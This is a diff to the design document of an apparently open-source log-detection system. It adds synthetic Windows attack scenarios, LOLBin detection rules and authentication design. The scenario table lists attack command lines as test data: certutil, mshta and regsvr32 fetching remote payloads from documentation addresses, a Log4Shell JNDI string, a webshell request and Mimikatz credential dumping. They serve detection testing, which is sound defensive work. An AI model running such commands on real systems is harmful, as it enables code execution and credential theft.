@@ -327,7 +327,7 @@ Combined format: `$remote_addr - $remote_user [$time_local] "$request" $status $
 
 ### 4.3 Demo data scenarios (`packages/loggen`)
 
-Company: "Andes Retail". Hosts: `bastion-01` (SSH jump host), `web-01`, `web-02` (nginx), `db-01`. IP plan: attackers from documentation ranges `192.0.2.0/24`, `198.51.100.0/24`, `203.0.113.0/24`; customers from the benchmarking range `198.18.0.0/15`; office and servers in `10.20.0.0/16`. No real people, domains or public addresses.
+Company: "Andes Retail". Hosts: `bastion-01` (SSH jump host), `web-01`, `web-02` (nginx), `db-01`, and the Windows workstations `ws-0142` and `ws-0187` with Sysmon (S5, `samples/<host>/sysmon.jsonl`). IP plan: attackers from documentation ranges `192.0.2.0/24`, `198.51.100.0/24`, `203.0.113.0/24`; customers from the benchmarking range `198.18.0.0/15`; office and servers in `10.20.0.0/16`. No real people, domains or public addresses.
 
 | Id | Host | What happens | ATT&CK | Expected detections |
 | --- | --- | --- | --- | --- |
@@ -342,6 +342,16 @@ Company: "Andes Retail". Hosts: `bastion-01` (SSH jump host), `web-01`, `web-02`
 | `path-traversal` | web-02 | `GET /download?file=../../../../etc/passwd` and `GET /download?file=..%252f..%252f..%252fetc%252fpasswd`; the rule reads only `cs-uri-query`, so the traversal must be in the query string | T1190 | SigmaHQ `web_path_traversal_exploitation_attempt.yml` |
 | `log4shell-probe` | web-02 | user agent `${jndi:ldap://203.0.113.99:1389/Basic/Command/Base64/aWQ=}`; the rule matches JNDI-Exploit-Kit paths such as `/Basic/Command/Base64/`. Keep it out of the query string, where `=${` would also fire `web_ssti_in_access_logs.yml` | T1190 | SigmaHQ `web_jndi_exploit.yml` |
 | `webshell` | web-01 | `GET /uploads/img.php?cmd=whoami`, then `GET /uploads/img.php?cmd=net+user` | T1505.003 | SigmaHQ `web_win_webshells_in_access_logs.yml` |
+| `office-macro-powershell` | ws-0142 | Word opens a macro document from Downloads and starts `powershell.exe` | T1566.001, T1204.002, T1059.001 | SigmaHQ `proc_creation_win_office_susp_child_processes.yml` |
+| `encoded-powershell` | ws-0142 | that PowerShell starts `powershell.exe -EncodedCommand <base64 of a Write-Output line>` | T1059.001, T1027 | SigmaHQ `proc_creation_win_powershell_encode.yml` |
+| `certutil-download` | ws-0142 | `certutil.exe -urlcache -split -f http://203.0.113.50/inventario.txt ...`, its connection (event 3) and the file it writes (event 11) | T1105 | SigmaHQ `proc_creation_win_certutil_download.yml`, `proc_creation_win_certutil_download_direct_ip.yml`; `centinela-win-lolbin-network-connection`, `centinela-win-lolbin-file-drop` |
+| `scheduled-task` | ws-0142 | `schtasks.exe /Create ... /TR "notepad.exe C:\Users\Public\Downloads\inventario.txt"` | T1053.005 | SigmaHQ `proc_creation_win_schtasks_creation.yml`, `proc_creation_win_schtasks_env_folder.yml` |
+| `mshta-remote-hta` | ws-0187 | `mshta.exe http://203.0.113.60/aviso-pago.hta` and its connection | T1218.005 | SigmaHQ `proc_creation_win_mshta_http.yml`; `centinela-win-lolbin-network-connection` |
+| `regsvr32-scriptlet` | ws-0187 | `regsvr32.exe /s /n /u /i:http://203.0.113.60/demo.sct scrobj.dll` | T1218.010 | SigmaHQ `proc_creation_win_regsvr32_network_pattern.yml` |
+| `rundll32-proxy` | ws-0187 | `rundll32.exe C:\Users\Public\Downloads\aviso.dat,DllRegisterServer` | T1218.011 | SigmaHQ `proc_creation_win_rundll32_uncommon_dll_extension.yml` |
+| `credential-dumping` | ws-0187 | an elevated `cmd.exe` runs `mk.exe "privilege::debug" "sekurlsa::logonpasswords" exit` | T1003.001 | SigmaHQ `proc_creation_win_hktl_mimikatz_command_line.yml` |
+
+Windows command lines only need to satisfy their rules and are inert (documentation addresses, a harmless encoded command, no real tool). Windows background traffic (service-host housekeeping all day; Outlook, Chrome, documents, proxy and mail connections and downloads on working days) must not trigger any rule at any level.
 
 Background traffic must not trigger `high`/`critical` alerts: admins logging in with public keys from the office range, at most two consecutive password typos by staff, cron sessions every 5 minutes, routine sudo (`apt`, `systemctl`, `journalctl`), logind sessions, customer browsing (`/`, `/products/*`, `/cart`, static assets), search engine bots, a few 404s (`/favicon.ico`, an occasional `/wp-login.php`).
 
@@ -376,6 +386,8 @@ JSON lines in either shape:
 - flat: `{"EventID": 1, "Computer": "WS-0142", "UtcTime": "...", "Image": "...", ...}`.
 
 `EventData` keys become Sigma fields unchanged. Event ID 1 → `process_start` (category `process`), 3 → `network_connection` (`network`), 11 → `file_create` (`file`). Others → `other`.
+
+Parser details (S5, `docs/decisions/S5.md`): `EventID` and `Computer` are added as fields; keys that are not Windows field names (`^[A-Za-z][A-Za-z0-9_]{0,127}$`) are left out of `fields`; time is `UtcTime`, else `SystemTime` / `TimeCreated`, read as UTC; `host` is `Computer`; `User` (`DOMAIN\name`) gives `user` = name and `user.domain`; `srcIp`/`srcPort` come from `SourceIp`/`SourcePort` for event 3 only, the remote end goes to `destination.ip`/`destination.port`; ECS-style `process.*` and `file.*` keys are added; an event from another provider or channel becomes `other`.
 
 The SigmaHQ regression samples are not JSON lines: each file is pretty-printed JSON, and 5 of the 267 files hold several objects back to back, so read them with a streaming JSON decoder. A sample file is named `<rule id>.json` and sits in a folder named after the rule file (without `.yml`); `info.yml` lists the rule under `rule_metadata`.
 
@@ -521,6 +533,8 @@ Base rules (`rules/centinela/`, Sigma format, ECS-style fields from §3.1):
 | `centinela-user-created` | `product: linux`, `service: auth` | `event.action: user_created` | low | privileged-account-created (also alerts) |
 | `centinela-user-added-to-privileged-group` | `product: linux`, `service: auth` | `event.action: user_added_to_group` and `group.name` in `sudo`, `wheel`, `adm`, `root` | medium | privileged-account-created (also alerts) |
 | `centinela-web-not-found` | `category: webserver` | `http.response.status_code: 404` | informational | web-scanning-burst (building block) |
+| `centinela-win-lolbin-network-connection` | `product: windows`, `category: network_connection` | `Image` ends with `\certutil.exe`, `\bitsadmin.exe`, `\mshta.exe` or `\regsvr32.exe`, `Initiated: 'true'`, `DestinationIp` outside private, loopback, link-local and unique-local ranges (S5) | medium | alerts on its own |
+| `centinela-win-lolbin-file-drop` | `product: windows`, `category: file_event` | the same `Image` list, `TargetFilename` not in `\CryptnetUrlCache\` or `\INetCache\` (S5) | medium | alerts on its own |
 
 Correlation rules (`rules/correlation/`):
 
@@ -612,7 +626,7 @@ CREATE TABLE rule_state (
 );
 ```
 
-S6 adds `admin_sessions`, `ingest_tokens` (hash, label, created/revoked timestamps) and `audit_log` in new migrations. Integration tests create a throwaway schema per run and drop it afterwards.
+S6 adds `admin_sessions` (HMAC of the session token, user name, created, last seen, expiry, IP, user agent), `ingest_tokens` (SHA-256 of the secret, label, display prefix, created/last used/revoked timestamps and actors) and `audit_log` (time, actor, action, target, IP, `details` jsonb; `seq`, an identity column added by migration `003_audit-log-sequence.sql`, orders the rows) in migration `002_auth-sessions-tokens-audit.sql`. Integration tests create a throwaway schema per run and drop it afterwards.
 
 ## 9. HTTP API
 
@@ -622,7 +636,7 @@ JSON over HTTP, all under `/api`. Request and response schemas live in `packages
 | --- | --- | --- | --- |
 | `GET /api/health` | liveness and database check | — | `{ status, db, version }` |
 | `POST /api/ingest` | ingest lines from agents and scripts | query `source`, `host`, `tz`; body `text/plain` lines or `application/x-ndjson`; `Authorization: Bearer <token>` | `IngestSummary` |
-| `POST /api/ingest/upload` | file upload from the dashboard | query `source`, `host`, `tz`; body `text/plain` (≤ 5 MB). No token: before S6 it is enabled only when `NODE_ENV` is not `production` (404 otherwise); S6 requires the dashboard session and CSRF | `IngestSummary` |
+| `POST /api/ingest/upload` | file upload from the dashboard | query `source`, `host`, `tz`; body `text/plain` (≤ 5 MB). No token: requires the dashboard session and the CSRF header (S6), in every environment | `IngestSummary` |
 | `GET /api/events` | search events | `from`, `to`, `source`, `host`, `user`, `ip`, `action`, `outcome`, `q` (full text), `cursor`, `limit` | page of `NormalizedEvent` |
 | `GET /api/events/:id` | one event | — | `NormalizedEvent` |
 | `GET /api/alerts` | list alerts | `status`, `level`, `ruleId`, `technique`, `host`, `ip`, `user`, `from`, `to`, `cursor`, `limit` | page of `Alert` |
@@ -636,7 +650,13 @@ JSON over HTTP, all under `/api`. Request and response schemas live in `packages
 | `GET /api/attack` | ATT&CK matrix data | `from`, `to` | `{ tactics: [{ id, shortname, name, techniques: [{ id, name, url, rules, alerts }] }] }` |
 | `GET /api/stream` | live changes (SSE) | — | events `alert.created`, `alert.updated`, `ping` |
 | `GET /api/rules/:id/playbook` | content pack (S7) | `lang` (`en` default, `es`) | `PlaybookResponse`: `{ ruleId, lang, playbook: { summary, whatItDetects, whyItMatters, triageSteps, falsePositives, responseSteps, severityRationale }, rule: { title, author, url, license }, generated: { tool, model, at, review, notice } }`; `404` when the rule is unknown or has no playbook |
-| `POST /api/auth/login`, `POST /api/auth/logout`, `GET /api/auth/me` | session auth (S6) | — | — |
+| `POST /api/auth/login`, `POST /api/auth/logout`, `GET /api/auth/me` | session auth (S6) | login body `{ username, password }` | `SessionInfo` (`204` for logout) |
+| `GET /api/tokens` | ingest tokens (S6) | — | `{ items: IngestToken[] }` (newest 200, revoked included, never secrets) |
+| `POST /api/tokens` | create an ingest token (S6) | body `{ label }` | `201 { token: IngestToken, secret }` (secret shown once) |
+| `POST /api/tokens/:id/revoke` | revoke an ingest token (S6) | — | `IngestToken` |
+| `GET /api/audit` | audit log (S6) | `action`, `cursor`, `limit` | page of `AuditEntry` |
+
+Since S6 every endpoint except `GET /api/health`, `POST /api/ingest` (bearer token) and `POST /api/auth/login` requires the dashboard session (`401` without it); state-changing requests also need the `X-CSRF-Token` header (`403` without it). See `docs/SECURITY.md`.
 
 ## 10. Realtime
 
@@ -653,12 +673,13 @@ JSON over HTTP, all under `/api`. Request and response schemas live in `packages
 
 ## 12. Security design
 
-- Trust boundaries: log sources → ingest endpoint (authenticated by token); browser → API (session after S6); repository → rules (trusted).
+- Trust boundaries: log sources → ingest endpoint (authenticated by token); browser → API (session cookie plus CSRF header, S6); repository → rules (trusted).
 - Attacker-controlled data: every log line and every field derived from it. Rendered as text only, stored with parameterized queries, matched with linear-time regexes, never executed.
-- Limits: 5 MB per ingest request, 8,192 characters per message, 1,000 lines per batch, rate limits on ingest and login, bounded SSE clients.
-- Headers: `helmet` defaults plus a strict Content Security Policy for the built web app (S6).
-- Secrets only in environment variables; production refuses to start with development defaults.
-- S6 writes `docs/THREAT_MODEL.md` with the full analysis.
+- Limits: 5 MB per ingest request, 8,192 characters per message, 1,000 lines per batch, rate limits on ingest and `/api/auth/*`, sign-in lockout, bounded SSE clients.
+- Authentication (S6): one admin (argon2id hash in `ADMIN_PASSWORD_HASH`), server-side sessions in PostgreSQL behind an httpOnly `__Host-centinela` cookie, CSRF double-submit (`__Host-centinela-csrf` cookie repeated in `X-CSRF-Token`) on every state-changing request, ingest tokens stored hashed, audit log of analyst actions.
+- Headers: API responses carry `helmet` headers with `default-src 'none'` and `Cache-Control: no-store`; the HTML (nginx in Docker, Vite in development) carries a strict Content Security Policy defined in `packages/web/security/headers.ts`.
+- Secrets only in environment variables; production refuses to start with development defaults or without the admin credentials.
+- `docs/THREAT_MODEL.md` has the full analysis; `docs/SECURITY.md` the operator's guide.
 
 ## 13. Testing strategy
 
@@ -679,7 +700,7 @@ Tests never call external networks. Database tests use a throwaway schema.
 - `packages/server`: `express`, `helmet`, `express-rate-limit`, `pg`, `node-pg-migrate`, `pino`, `pino-http`, `yaml`, `uuid`, `re2-wasm`, `ipaddr.js`; dev: `@types/express`, `@types/pg`, `supertest`, `@types/supertest`, `pino-pretty`.
 - `packages/web`: `react`, `react-dom`, `react-router`, `@tanstack/react-query`, `recharts`, `i18next`, `react-i18next`, `clsx`, `lucide-react`; dev: `vite`, `@vitejs/plugin-react`, `tailwindcss`, `@tailwindcss/vite`, `@testing-library/react`, `@testing-library/jest-dom`, `@testing-library/user-event`, `jsdom`, `msw`.
 - `packages/loggen`: no runtime dependencies (own PRNG); uses `@centinela/shared` types.
-- Later sessions may add: `argon2` (S6), a CSP helper if needed (S6).
+- Later sessions may add: `argon2` (S6, added to `packages/server`), a CSP helper if needed (S6: not needed, the policy is a plain string in `packages/web/security/headers.ts`).
 
 ## 15. Configuration
 
@@ -692,6 +713,11 @@ Tests never call external networks. Database tests use a throwaway schema.
 | `INGEST_TOKEN` | `dev-ingest-token-change-me` | required, at least 32 characters, in production |
 | `RULES_DIR` | `./rules` | |
 | `CONTENT_DIR` | `./content` | S7 |
-| `TRUST_PROXY` | `false` | set when behind a reverse proxy (rate limiting by client IP) |
-| `ADMIN_USERNAME`, `ADMIN_PASSWORD_HASH`, `SESSION_SECRET` | — | S6 |
+| `TRUST_PROXY` | `false` | set when behind a reverse proxy (rate limiting, lockout and audit by client IP): a hop count (1–32) or a comma-separated list of proxy addresses, subnets or `loopback`/`linklocal`/`uniquelocal`; `true` is refused (S6) |
+| `ADMIN_USERNAME` | `admin` | S6; required in production |
+| `ADMIN_PASSWORD_HASH` | argon2id hash of `centinela-dev` | S6; required in production (`npm run hash-password`), argon2id with m ≥ 19456 and t ≥ 2, never the development password |
+| `SESSION_SECRET` | `dev-session-secret-change-me` | S6; keys session ids and CSRF tokens; required, at least 32 characters, in production |
+| `SESSION_IDLE_MINUTES`, `SESSION_MAX_HOURS` | `120`, `12` | S6; idle and absolute session lifetime (at most 168 hours) |
+| `LOGIN_MAX_FAILURES`, `LOGIN_LOCKOUT_MINUTES` | `5`, `15` | S6; per-IP sign-in lockout |
+| `RATE_LIMIT_INGEST_PER_MINUTE`, `RATE_LIMIT_UPLOAD_PER_MINUTE`, `RATE_LIMIT_AUTH_PER_MINUTE` | `120`, `30`, `30` | per client IP (S1's constants, moved to configuration in S6) |
 | `VITE_USE_MOCKS` | `false` | web: use MSW instead of the API |
